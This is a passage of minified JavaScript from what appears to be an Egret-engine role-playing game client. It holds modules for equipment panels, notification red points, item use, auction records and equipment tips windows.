__extends(e,t),e.prototype.dataChanged=function(){this.num.text=""+this.data.num,this.icon.source=""+this.data.icon},e}(n.BaseItemRender);e.ItemNum=o,window.ItemNum=o,__reflect(o.prototype,"ItemNum",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ExtremeEquipRedPoint=void 0;var n=i(14),o=i(13),s=i(126),a=i(62),r=i(6),l=i(26),h=function(t){function e(){var e=t.call(this)||this;return e.redPoint=0,observe(e,e.postRedPoint,r.BagCT.ins().postItemAdd,r.BagCT.ins().postItemDel,r.BagCT.ins().postItemChange,l.ZsCT.ins().postZsLv),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postRedPoint=function(){if(!s.ExtremeEquipCC.checkOpen())return null;var t=this.redPoint;this.redPoint=0;for(var e=o.SubRoles.ins().subRolesLen,i=0;e>i;i++){var n=o.SubRoles.ins().getSubRoleByIndex(i),a=n.job;if(this.getRedPointByJob(a)){this.redPoint=1;break}}return t==this.redPoint?null:this.redPoint},e.prototype.getRedPointByJob=function(t){for(var e=a.EquipPos.WEAPON;e<=a.EquipPos.SHOE;e++)if(s.ExtremeEquipCC.canOperate(e))return!0;return!1},__decorate([post()],e.prototype,"postRedPoint",null),e}(n.BaseSystem);e.ExtremeEquipRedPoint=h,window.ExtremeEquipRedPoint=h,__reflect(h.prototype,"ExtremeEquipRedPoint",[]),Systemap.ExtremeEquipRedPoint=function(){return h.ins()},window.ExtremeEquipRedPoint=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForgeRedPoint=void 0;var n=i(14),o=i(96),s=i(139),a=i(13),r=i(6),l=i(4),h=i(0),u=function(t){function e(){var e=t.call(this)||this;return e.roleTabs={},e.flexible={},e.tabs={},e.roleTabs={},e.flexible={},e.redPoint=!1,e}return __extends(e,t),e.prototype.postForgeRedPoint=function(){var t=this.redPoint;return this.redPoint=this.tabs[s.ForgeWin.Page_Select_Boost]||this.tabs[s.ForgeWin.Page_Select_ZhuLing]||this.tabs[s.ForgeWin.Page_Select_Gem]||this.tabs[s.ForgeWin.Page_Select_Weapon],t==this.redPoint?null:this.redPoint},e.prototype.getRedPoint=function(t){return this.tabs[t]},e.prototype.getFlexibleRoleRedPoint=function(t){return this.flexible[t]},e.prototype.postForgeBoostRedPoint=function(){for(var t=s.ForgeWin.Page_Select_Boost,e=this.tabs[t]||!1,i=!1,n=a.SubRoles.ins().subRolesLen,l=0;n>l;l++){var h=a.SubRoles.ins().getSubRoleByIndex(l),u=h.getMinEquipIndexByType(t),p=h.getEquipByIndex(u).strengthen,d=o.ForgeCT.ins().getEnhanceCostConfigByLv(p+1);if(d){var c=d.stoneNum;if(c){var f=d.stoneId,g=r.BagCT.ins().getBagGoodsCountById(r.BagCT.BAG_TYPE_OTHTER,f);if(g>=c){var m=o.ForgeCT.ins().isMaxForge(h,t);m&&(i=!0)}this.roleTabs[t]||(this.roleTabs[t]={}),this.roleTabs[t][l]=g>=c}}}return this.tabs[t]=i,e==i?null:i},e.prototype.postForgeZhulingRedPoint=function(){for(var t=s.ForgeWin.Page_Select_ZhuLing,e=this.tabs[t]||!1,i=!1,n=a.SubRoles.ins().subRolesLen,l=0;n>l;l++){var h=a.SubRoles.ins().getSubRoleByIndex(l),u=h.getMinEquipIndexByType(t),p=h.getEquipByIndex(u).zhuling,d=o.ForgeCT.ins().getZhulingCostConfigByLv(p+1);if(d){var c=d.count;if(c){var f=d.itemId,g=r.BagCT.ins().getBagGoodsCountById(r.BagCT.BAG_TYPE_OTHTER,f);if(g>=c){var m=o.ForgeCT.ins().isMaxForge(h,t);m&&(i=!0)}this.roleTabs[t]||(this.roleTabs[t]={}),this.roleTabs[t][l]=g>=c
}}}return this.tabs[t]=i,e==i?null:i},e.prototype.postForgeGemRedPoint=function(){if(l.ActorCC.level<h.GlobalConfig.StoneOpenConfig[0].openLv)return null;for(var t=s.ForgeWin.Page_Select_Gem,e=this.tabs[t]||!1,i=!1,n=a.SubRoles.ins().subRolesLen,r=0;n>r;r++){var u=a.SubRoles.ins().getSubRoleByIndex(r),p=u.getMinEquipIndexByType(t),d=u.getEquipByIndex(p).gem,c=o.ForgeCT.ins().getStoneLevelCostConfigByLv(d+1);if(c){var f=c.soulNum;if(f){var g=(c.stoneId,l.ActorCC.soul);if(g>=f){var m=o.ForgeCT.ins().isMaxForge(u,t);m&&(i=!0)}this.roleTabs[t]||(this.roleTabs[t]={}),this.roleTabs[t][r]=g>=f}}}return this.tabs[t]=i,e==i?null:i},__decorate([post()],e.prototype,"postForgeRedPoint",null),__decorate([post()],e.prototype,"postForgeBoostRedPoint",null),__decorate([post()],e.prototype,"postForgeZhulingRedPoint",null),__decorate([post()],e.prototype,"postForgeGemRedPoint",null),e}(n.BaseSystem);e.ForgeRedPoint=u,window.ForgeRedPoint=u,__reflect(u.prototype,"ForgeRedPoint",[]),Systemap.ForgeRedPoint=function(){return u.ins()},window.ForgeRedPoint=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WushuangEquipPanel=void 0;var n=i(1),o=i(0),s=i(151),a=i(685),r=(i(6),i(686)),l=i(223),h=i(21),u=i(12),p=i(15),d=i(2),c=i(67),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.items=[],e.curRole=0,e}return __extends(e,t),e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=u.OpenSystem.ins().checkSysOpen(p.SystemType.WuShuangPanel);return i||(d.TipsCT.ins().showTips(u.OpenSystem.ins().getNoOpenTips(p.SystemType.WuShuangPanel)),win.open(c.View_BianQiang,2)),i},e.showCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return u.OpenSystem.ins().checkSysShow(p.SystemType.WuShuangPanel)},e.prototype.skinComplete=function(){for(var t=this,e=0;;){var i=this["eItem"+e];if(!i)break;this.items.push(i),this.addTouchEvent(this.items[e],function(e){var i=t.items.indexOf(e.currentTarget);o.GlobalConfig.PeerlessBaseConfig.initequip;return void win.open(a.WushuangEquipTips,s.WushuangEquipCT.ins().data[t.curRole],i,t.curRole)}),e++}this.setRoleId(this.curRole),this.addTouchEvent(this.eBtn0,this.openSuit),this.addTouchEvent(this.eBtn1,this.openSuit),this.addTouchEvent(this.eBtn2,this.openSuit),this.addTouchEvent(this.btnHelp,this.openHelp)},e.prototype.openHelp=function(){var t;win.open("CommonHelpWin",(null===(t=o.GlobalConfig.HelpInfoConfig[334])||void 0===t?void 0:t.text)||"")},e.prototype.openSuit=function(t){win.open(r.WushuangEquipSuit,s.WushuangEquipCT.ins().data[this.curRole],+t.currentTarget.name)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.update,s.WushuangEquipCT.ins().updateData),observe(this,this.updateAllRp,l.WushuangRP.ins().updateRed)},e.prototype.updateMc=function(t){if(s.WushuangEquipCT.ins().data[this.curRole]&&void 0!=s.WushuangEquipCT.ins().data[this.curRole]){for(var e=s.WushuangEquipCT.getStage(s.WushuangEquipCT.ins().data[this.curRole][t][0]),i=0;i<this.items[t].numChildren;i++)i&&(this.items[t].getChildAt(i).visible=!!e);var n=this["eff"+t];if(e){if(!n.numChildren){var o=new h.MovieClip;o.playFile(RES_DIR_EFF+n.name,-1),n.addChild(o),o=new h.MovieClip,o.playFile(RES_DIR_EFF+"zhizuneff",-1),n.addChild(o)}}else n.removeChildren();this.items[t].eJs.text=e?e:"0",this.updateRp(t)}},e.prototype.updateAllRp=function(){for(var t in this.items)this.updateRp(+t)},e.prototype.updateRp=function(t){if(this.items&&this.items[t]){var e=l.WushuangRP.ins().erps;e&&(this.items[t].eRP.visible=e[this.curRole][t])}},e.prototype.update=function(t){this.updateMc(t)},e.prototype.setRoleId=function(t){if(this.curRole=t,this.skin)for(var e in this.items)this.update(+e)},e.prototype.tabRp=function(){var t=l.WushuangRP.ins().erps;if(t)for(var e in t[this.curRole])if(t[this.curRole][e])return!0;return!1},e}(n.BaseView);e.WushuangEquipPanel=f,window.WushuangEquipPanel=f,__reflect(f.prototype,"WushuangEquipPanel",[]),window.WushuangEquipPanel=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WushuangEquipTips=void 0;var n=i(1),o=i(151),s=i(21),a=i(0),r=i(5),l=i(65),h=i(6),u=i(2),p=i(16),d=i(18),c=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="WushuangEquipTipsSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.eBtn,this.isBtn);var t=new s.MovieClip;t.playFile(RES_DIR_EFF+"zhizuneff",-1),this.eGroup.addChild(t)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.pos=t[1],this.currentState=this.pos+"",this.roleIndex=t[2],this.update(),observe(this,this.update,o.WushuangEquipCT.ins().updateData),observe(this,this.setUpAni,o.WushuangEquipCT.ins().updateData)},e.prototype.removeDisplay=function(){this.skin&&(this.mc0&&(this.mc0.stop(),p.DisplayUtils.removeFromParent(this.mc0)),this.removeObserve(),egret.Tween.removeTweens(this.ItemImg))},e.prototype.isBtn=function(){if(0==o.WushuangEquipCT.ins().data[0][this.pos][0]){var t=h.BagCT.ins().getBagItemById(a.GlobalConfig.PeerlessBaseConfig.initequip[this.pos]);if(!t||void 0==t)return void u.TipsCT.ins().showTips(gettext("所需道具不足"));o.WushuangEquipCT.ins().sendEquip(t.handle,0,this.pos)}else{var t=h.BagCT.ins().getBagItemById(a.GlobalConfig.PeerlessBaseConfig.initequip[this.pos]);if(!t||void 0==t)return void u.TipsCT.ins().showTips(gettext("所需道具不足"));o.WushuangEquipCT.ins().sendStage(this.roleIndex,this.pos)}},e.prototype.update=function(){var t=0==o.WushuangEquipCT.ins().data[0][this.pos][0]?a.GlobalConfig.PeerlessBaseConfig.initequip[this.pos]:Number(o.WushuangEquipCT.ins().data[0][this.pos][0]);this.itemCfg=a.GlobalConfig.ItemConfig[t];var e=(o.WushuangEquipCT.getStage,o.WushuangEquipCT.getTz),i=o.WushuangEquipCT.getTzPosAllName,n=(o.WushuangEquipCT.getTzLevel,o.WushuangEquipCT.getTzLevelCount),s=o.WushuangEquipCT.getWushuangItemAtt,u=o.WushuangEquipCT.getTzAttrStr,p=o.WushuangEquipCT.getTzSkill,c=o.WushuangEquipCT.getTzLevelNow;this.jieshu=c(this.pos),this.tz=e(this.pos),this.eName.text=this.itemCfg.name,this.eZs.text=this.itemCfg.zsLevel+gettext("转");var f=!1;if(a.GlobalConfig.PeerlessSuitConfig[this.tz][this.jieshu+1]){var g=o.WushuangEquipCT.getTzLevelCount(this.tz,o.WushuangEquipCT.ins().data[0],this.jieshu+1),m=a.GlobalConfig.PeerlessBaseConfig;if(m){var v=m.rateNeed[this.tz-1],y=g>=v;if(y){var C=o.WushuangEquipCT.getTzLevelNow1(this.pos);0!=C&&(f=!0)}}}0==o.WushuangEquipCT.ins().data[0][this.pos][0]?this.eJs.text=this.jieshu+"":this.eJs.text=(f?this.jieshu+1:this.jieshu)+"",this.ePow.setPower(o.WushuangEquipCT.ins().data[0][this.pos][1]);var T=i(this.tz,o.WushuangEquipCT.ins().data[0],f?this.jieshu+1:this.jieshu);this.eTzPos.textFlow=(new egret.HtmlTextParser).parse(T.join(","));var b=n(this.tz,o.WushuangEquipCT.ins().data[0],f?this.jieshu+1:this.jieshu),w=a.GlobalConfig.PeerlessBaseConfig.rateNeed,I=w[this.tz-1],_=b>=I,S=0!=o.WushuangEquipCT.ins().data[0][this.pos][0]&&_;this.eAttr.textFlow=r.TextFlowMaker.generateTextFlow1(s(t,f?this.jieshu+1:this.jieshu,!0,S)),this.eTzAttr.text=u(this.tz,f?this.jieshu+1:this.jieshu).join("\n"),_?(this.eTzAttr.textColor=3342080,this.eTzStage.textColor=3532333,this.eTzStage.text="（"+I+"/"+I+"）"):this.eTzStage.text="（"+b+"/"+I+"）";var x=b>=T.length;this.eTzSkill.text="（"+b+"/"+T.length+"）";var D=p(this.tz,f?this.jieshu+1:this.jieshu);if(this.eTzSkillDesc.textFlow=r.TextFlowMaker.generateTextFlow(l.SkillUtil.getDesc(D)),x&&(this.eTzSkill.textColor=this.eTzSkillDesc.textColor=15054355),this.eUpgrade.visible=!isNaN(this.roleIndex),this.eUpgrade.visible){var A=a.GlobalConfig.PeerlessStageConfig[t];if(!A)return void(this.eUpgrade.visible=!1);var k=A.consume[0],B=h.BagCT.ins().getBagItemCount(h.BagCT.BAG_TYPE_OTHTER,k.id);0==o.WushuangEquipCT.ins().data[0][this.pos][0]?this.eNeed.textFlow=r.TextFlowMaker.generateTextFlow1("|C:"+(B>0?d.ColorUtil.GREEN:d.ColorUtil.RED)+"&T:"+B+"|/1"):this.eNeed.textFlow=r.TextFlowMaker.generateTextFlow1("|C:"+(B>=k.count?d.ColorUtil.GREEN:d.ColorUtil.RED)+"&T:"+B+"|/"+k.count),this.eRP.visible=B>=k.count}this.eBtn.label=0==o.WushuangEquipCT.ins().data[0][this.pos][0]?gettext("激 活"):gettext("进 阶")},e.prototype.setUpAni=function(){var t=this;this.mc0&&(this.mc0.stop(),p.DisplayUtils.removeFromParent(this.mc0)),this.mc0=new s.MovieClip,this.eGroup.addChild(this.mc0),egret.Tween.get(this.ItemImg).to({horizontalCenter:5},50).to({horizontalCenter:-5},50).to({horizontalCenter:5},50).to({horizontalCenter:-5},50).to({horizontalCenter:0},25).call(function(){t.mc0.playFile(RES_DIR_EFF+"wushuangUp",1)})},e}(n.BaseView);e.WushuangEquipTips=c,window.WushuangEquipTips=c,__reflect(c.prototype,"WushuangEquipTips",[]),window.WushuangEquipTips=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WushuangEquipSuit=void 0;var n=i(1),o=i(151),s=i(21),a=i(0),r=i(5),l=i(65),h=i(16),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="WushuangEquipSuitSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.ids=t[0],this.tz=t[1],this.currentState=this.tz+"";for(var i=o.WushuangEquipCT.getTzPosAll,n=o.WushuangEquipCT.getStage,u=o.WushuangEquipCT.getTzPosAllName,p=o.WushuangEquipCT.getTzAttrStr,d=o.WushuangEquipCT.getTzSkill,c=o.WushuangEquipCT.getTzLevelCount,f=o.WushuangEquipCT.getTzLevel,g=i(this.tz),m=0,v=g;m<v.length;m++){var y=v[m],C=this["eItem"+y];if(C.alpha=this.ids[y][0]?1:0,C.alpha){var T=this["eff"+y],b=new s.MovieClip;b.playFile(RES_DIR_EFF+T.name,-1),T.addChild(b),b=new s.MovieClip,b.playFile(RES_DIR_EFF+"zhizuneff",-1),T.addChild(b)}var w=n(this.ids[y][0]);C.eJs.text=w?w:""}var I=f(this.tz,this.ids)||1;this.eJs.text=""+I;var _=u(this.tz,this.ids,I);this.eTzPos.textFlow=(new egret.HtmlTextParser).parse(_.join(","));var S=c(this.tz,this.ids,I),x=a.GlobalConfig.PeerlessBaseConfig.rateNeed,D=x[this.tz-1],A=S>=D;this.eTzAttr.text=p(this.tz,I).join("\n"),A?(this.eTzAttr.textColor=3342080,this.eTzStage.textColor=3532333,this.eTzStage.text="（"+D+"/"+D+"）"):this.eTzStage.text="（"+S+"/"+D+"）";var k=S>=_.length;this.eTzSkill.text="（"+S+"/"+_.length+"）";var B=d(this.tz,I);if(this.eTzSkillDesc.textFlow=r.TextFlowMaker.generateTextFlow(l.SkillUtil.getDesc(B)),k&&(this.eTzSkill.textColor=this.eTzSkillDesc.textColor=15054355),a.GlobalConfig.PeerlessSuitConfig[this.tz][I+1]){this.eJs1.text=""+(I+1);var P=u(this.tz,this.ids,I+1);this.eTzPos1.textFlow=(new egret.HtmlTextParser).parse(P.join(","));var R=c(this.tz,this.ids,I+1),E=x[this.tz-1],G=R>=E;G?(this.eTzAttr1.textColor=3342080,this.eTzStage1.textColor=3532333,this.eTzStage1.text="（"+E+"/"+E+"）"):this.eTzStage1.text="（"+R+"/"+E+"）",this.eTzSkill1.text="（"+R+"/"+P.length+"）",this.eTzAttr1.text=p(this.tz,I+1).join("\n");var M=d(this.tz,I+1);this.eTzSkillDesc1.textFlow=r.TextFlowMaker.generateTextFlow(l.SkillUtil.getDesc(M))}else h.DisplayUtils.removeFromParent(this.eNext)},e}(n.BaseView);e.WushuangEquipSuit=u,window.WushuangEquipSuit=u,__reflect(u.prototype,"WushuangEquipSuit",[]),window.WushuangEquipSuit=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipInlayItem=void 0;var n=i(19),o=i(3),s=i(0),a=i(207),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="GemItemSkin",e.isSelected=!1,e}return __extends(e,t),e.prototype.destruct=function(){},e.prototype.skinComplete=function(){this.addTouchEvent(this,this.touch)},e.prototype.dataChanged=function(){var t=this.data;t||(t=new a.EquipInlayData);var e=t.itemData.getGemLvColor();if(this.bg_lv.source="gem_bd"+(e?e:1),this.lock.visible=t.isLock,this.imgAdd.visible=!t.isLock&&!!t.itemData&&0==t.itemData.handle,this.item.visible=!t.isLock&&!this.imgAdd.visible,this.item.visible){var i=s.GlobalConfig.GemPrefixConfig[t.getPfId()];this.item.source=i?i.icon:""}},e.prototype.touch=function(){if(this.selected){var t=this.data;if(t.isLock||!t.itemData||0==t.itemData.handle)return;var e=t.itemData,i=e.itemConfig;n.GlobalFun.showDetail(i,e)}},e}(o.BaseItemRender);e.EquipInlayItem=r,window.EquipInlayItem=r,__reflect(r.prototype,"EquipInlayItem",[]),window.EquipInlayItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipInlaySkillItem=void 0;var n=i(5),o=i(3),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GemSkillItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){this.data&&(this.lbDes.textFlow=n.TextFlowMaker.generateTextFlow1(this.data))},e}(o.BaseItemRender);e.EquipInlaySkillItem=s,window.EquipInlaySkillItem=s,__reflect(s.prototype,"EquipInlaySkillItem",[]),window.EquipInlaySkillItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FloatWinCT=void 0;var n=i(14),o=i(0),s=i(91),a=i(39),r=i(4),l=i(13),h=i(130),u=i(6),p=i(10),d=i(32),c=i(25),f=i(2),g=i(26),m=i(7),v=i(19),y=i(86),C=i(36),T=i(209),b=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.bossBoxIdList=[230001,230002,230003],e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.showItemWin=function(t){win.open("FloatingWindowView",t)},e.prototype.removeItemWin=function(t,e){removeFromParent(t)},e.prototype.checkCanMerge=function(t){var e=t.itemConfig.id;return!!o.GlobalConfig.ItemComposeConfig[e]},e.prototype.onMerge=function(){var t=this._data.itemConfig,e=t.id,i=this._data.count,n=o.GlobalConfig.ItemComposeConfig[e];return n.srcCount>i?void f.TipsCT.ins().showTips(gettext("数量不足,不能合成")):void u.BagCT.ins().sendMergeItem(e,i)},e.prototype.onUseType13=function(){var t=this._data.itemConfig,e=t.useCond;if(300==t.descIndex)return void this.onUseType13_300();if(302==t.descIndex)return void this.onUseType13_302();if(200215==t.id)return void this.onUseType13_swly();if(200216==t.id)return void this.onUseType13_symd();if(!e)return void f.TipsCT.ins().showTips(gettext("错误卷轴的使用类型"));var i=0,n=t.name;return i>0?void f.TipsCT.ins().showTips(gettext("无{0}挑战次数时,才能使用",n)):(f.TipsCT.ins().showTips(gettext("使用成功,获得{0}次{1}挑战次数",this.useNum,n)),void u.BagCT.ins().sendUseItem(this.goodsId,this.useNum))},e.prototype.onUseType13_symd=function(){f.TipsCT.ins().showTips(gettext("使用成功,获得{0}次深渊boss归属次数",this.useNum)),u.BagCT.ins().sendUseItem(this.goodsId,this.useNum)},e.prototype.onUseType13_swly=function(){return __awaiter(this,void 0,void 0,function(){var t,e,n,s=this;return __generator(this,function(a){switch(a.label){case 0:return t=o.GlobalConfig.CrossBossBase,t&&t.bossBelongMaxCount?(f.TipsCT.ins().showTips(gettext("已达到当前每日归属上限")),[2]):(e=gettext("确定使用{0}个<font color='#FFB82A'>跨服挑战卷轴</font>进入挑战？\n",1),[4,Promise.resolve().then(function(){return i(27)})]);case 1:return n=a.sent().WarnWin,n.show(e,function(){u.BagCT.ins().registerUseItemFunc(s.goodsId,function(){}),f.TipsCT.ins().showTips(gettext("使用成功,获得1次神威boss归属次数")),u.BagCT.ins().sendUseItem(s.goodsId,1)},this),[2]}})})},e.prototype.onUseType13_300=function(){var t=d.FbCT.ins().fbRings.challengeTime;return t>0?void f.TipsCT.ins().showTips(gettext("无挑战次数时,才能使用")):(f.TipsCT.ins().showTips(gettext("使用成功,获得{0}次烈焰副本挑战次数",this.useNum)),void u.BagCT.ins().sendUseItem(this.goodsId,this.useNum))},e.prototype.onUseType13_302=function(){f.TipsCT.ins().showTips(gettext("使用成功,获得{0}次神兵副本挑战次数",this.useNum)),u.BagCT.ins().sendUseItem(this.goodsId,this.useNum)},e.prototype.onUseType14=function(){win.open("RenameWin")},e.prototype.onUse=function(t,e,i){var n,o;void 0===i&&(i=!1),this._data=t,this.goodsId=this._data.configID,this.useNum=e;var d=this._data.itemConfig;if(d.id==s.ItemConst.SKILLEXP)return void y.SkillCT.ins().sendSkillVule(e);this.checkCanMerge(this._data)&&this.onMerge();var b=p.ItemUtil.getType(d);if(b==a.ItemType.TYPE_13)return void this.onUseType13();if(b==a.ItemType.TYPE_14)return void this.onUseType14();if(d.id==s.ItemConst.LEVELUP_ITEM){var w=c.Recharge.ins().getRechargeData(0);if(!w.num)return f.TipsCT.ins().showTips(gettext("充值任意金额才能开启礼包")),void c.RechargeData.checkOpenWin()}if(b!=a.ItemType.TYPE_9){if(this.isBossBox)return void win.open("RandBossWin",this.goodsId);if(b==a.ItemType.TYPE_47){if(this._data.endTime>m.GameServerCC.serverTime&&!v.GlobalFun.checkCost(d.needyuanbao*e,C.MoneyConst.yuanbao))return}else if(i&&(d.needyuanbao&&r.ActorCC.yb<d.needyuanbao*e||(null===(n=d.useArg)||void 0===n?void 0:n["double"])&&r.ActorCC.yb<(null===(o=d.useArg)||void 0===o?void 0:o["double"])*e))return void f.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:元宝不足|"));if(b==a.ItemType.TYPE_8){var I=d.level?d.level:0,_=d.zsLevel?d.zsLevel:0;if(!(r.ActorCC.level>=I&&g.ZsCT.ins().stage>=_)){var S="";return g.ZsCT.ins().stage<_&&(S+=gettext("{0}转",_)),r.ActorCC.level<I&&(S+=gettext("{0}级",I)),void f.TipsCT.ins().showTips(gettext("需要{0}后使用",S))}}if(b==a.ItemType.TYPE_25)return void h.Auction.ins().sendOpenAuBox(d.id);if(-1!=T.GConst.DoubleItem.indexOf(d.id)){var x=d.useArg,D=i?2:1,A=(x.exp||0)*this.useNum*D;A>0&&f.TipsCT.ins().showTips(gettext("|C:0x45ff7a&T:经验+{0}|",A))}var k=p.ItemUtil.getJob(d);return 0!=k&&l.SubRoles.ins().getSubRoleByIndex(0).job!=k?void f.TipsCT.ins().showTips(gettext("职业不符")):void u.BagCT.ins().sendUseItem(this.goodsId,this.useNum,i)}},e}(n.BaseSystem);e.FloatWinCT=b,window.FloatWinCT=b,__reflect(b.prototype,"FloatWinCT",[]),Systemap.FloatWinCT=function(){return b.ins()},window.FloatWinCT=b},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AuctionVo=void 0;var n=function(){function t(t){this.parser(t)}return t.prototype.parser=function(t){this.type=t.readByte(),this.endTime=t.readInt(),this.id=t.readInt(),this.putAwayTime=t.readInt(),this.aID=t.readInt(),this.auctionTimes=t.readByte(),this.myAuPrice=t.readByte(),this.owner=t.readByte()},t}();e.AuctionVo=n,window.AuctionVo=n,__reflect(n.prototype,"AuctionVo",[]),window.AuctionVo=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AuctionRecordVo=void 0;var n=function(){function t(t){this.type=0,this.parser(t)}return t.prototype.parser=function(t){this.aId=t.readInt(),this.roleName=t.readString(),this.state=t.readByte(),this.price=t.readInt(),this.time=t.readInt()},t}();e.AuctionRecordVo=n,window.AuctionRecordVo=n,__reflect(n.prototype,"AuctionRecordVo",[]),window.AuctionRecordVo=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WushuangEquipDelWin=void 0;var n=i(5),o=i(1),s=i(0),a=i(10),r=i(65),l=i(151),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="WSEquipTipsSkin",e.itemID=0,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.itemIcon.data=t[0],this.itemID=t[1],this.updateData()},e.prototype.updateData=function(){var t=l.WushuangEquipCT.getStage(this.itemID);this.eJs.text=t+"",this.eAttr.textFlow=(new egret.HtmlTextParser).parse(l.WushuangEquipCT.getWushuangItemAtt(this.itemID,t,!1));var e=0;e=this.getPos(this.itemID),this.pos.text=s.GlobalConfig.PeerlessEquipConfig[e][this.itemID].posname;var i=l.WushuangEquipCT.getTz(e),o=l.WushuangEquipCT.getTzLevelCount(i,l.WushuangEquipCT.ins().data[0],t),h=s.GlobalConfig.PeerlessBaseConfig.rateNeed,u=h[i-1];this.eTzStage.text="（"+o+"/"+u+"）",this.eTzAttr.text=l.WushuangEquipCT.getTzAttrStr(i,t).join("\n");var p=l.WushuangEquipCT.getTzPosAllName(i,l.WushuangEquipCT.ins().data[0],t);this.eTzSkill.text="（"+o+"/"+p.length+"）";var d=l.WushuangEquipCT.getTzSkill(i,t);this.eTzSkillDesc.textFlow=n.TextFlowMaker.generateTextFlow(r.SkillUtil.getDesc(d)),this.eName.text=s.GlobalConfig.ItemConfig[this.itemID].name+"";var c=a.ItemUtil.getAttrData(s.GlobalConfig.ItemConfig[this.itemID]),f=a.ItemUtil.getAttrPower(c);this.powerLab.text=f+""},e.prototype.getPos=function(t){for(var e in s.GlobalConfig.PeerlessBaseConfig.initequip)if(Number(s.GlobalConfig.PeerlessBaseConfig.initequip[e])==t)return Number(e);return 0},e}(o.BaseView);e.WushuangEquipDelWin=h,window.WushuangEquipDelWin=h,__reflect(h.prototype,"WushuangEquipDelWin",[]),window.WushuangEquipDelWin=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TunTianEquipTipsWin=void 0;var n=i(18),o=i(5),s=i(1),a=i(22),r=i(0),l=i(10),h=i(113),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="TunTianEquipTipsSkin",e.itemID=0,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.itemIcon.data=t[0],this.itemID=t[1],this.updateData()},e.prototype.updateData=function(){var t=r.GlobalConfig.ItemConfig[this.itemID],e=l.ItemUtil.getSubType(t);this.pos.text=r.GlobalConfig.TunTianBaseConf.tuntian[e]||"",this.eName.text=r.GlobalConfig.ItemConfig[this.itemID].name+"";var i=r.GlobalConfig.TunTianLevelUp[e]&&r.GlobalConfig.TunTianLevelUp[e][1],n=h.TunTianEquipSystem.ins().otherSystemParam(e,1),s=a.AttributeData.getAttrShowStrNoColor(i.attr,":",!1,0,!0);this.eAttr.textFlow=o.TextFlowMaker.generateTextFlow1(s),this.eAttr0.textFlow=o.TextFlowMaker.generateTextFlow1(n.join("\n")),this.updateTz()},e.prototype.updateTz=function(){this.title0.text=gettext("套装效果");var t=r.GlobalConfig.TunTianSuitConf,e="";for(var i in t){var s=t[i];1==s.level&&(e+=gettext("·吞噬装备{2}：{0}件套{1}级激活属性：",s.count[0],s.level,s.level)+"\n",e+="|C:'"+n.ColorUtil.GREEN+"'>&T:"+s.desc+"|\n")}this.attr0.textFlow=o.TextFlowMaker.generateTextFlow(e)},e}(s.BaseView);e.TunTianEquipTipsWin=u,window.TunTianEquipTipsWin=u,__reflect(u.prototype,"TunTianEquipTipsWin",[]),window.TunTianEquipTipsWin=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TunTianSettleTips=void 0;var n=i(18),o=i(1),s=i(0),a=i(4),r=i(113),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="TunTianSettleTipsSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(t,e){this.icon&&(this.icon.source=t,this.desc.textFlow=tHtml(e))},e.open=function(t,i,o){var l=r.TunTianEquipSystem.ins(),h=l.info[t]&&l.info[t][i],u=h&&(!h.tuntianval||0==h.tuntianval)||!h,p="",d=s.GlobalConfig.TunTianSetConf[t]&&s.GlobalConfig.TunTianSetConf[t][i],c=s.GlobalConfig.MonstersConfig[o],f=d&&d.name||"",g=c&&c.name,m="tunshi"+(null===c||void 0===c?void 0:c.head)+"_png";u?(p=gettext("恭喜<font color={0}>{1}</font>\n",n.ColorUtil.GREEN,"<font color='"+n.ColorUtil.ROLENAME_COLOR_YELLOW+"'>"+a.ActorCC.myName+"</font>"),p+=gettext("<font color={0}>{1}</font> 觉醒，吞噬了{2}",n.ColorUtil.RED,f,"<font color='"+n.ColorUtil.GREEN+"'>"+g+"</font>")):(p=gettext("你的<font 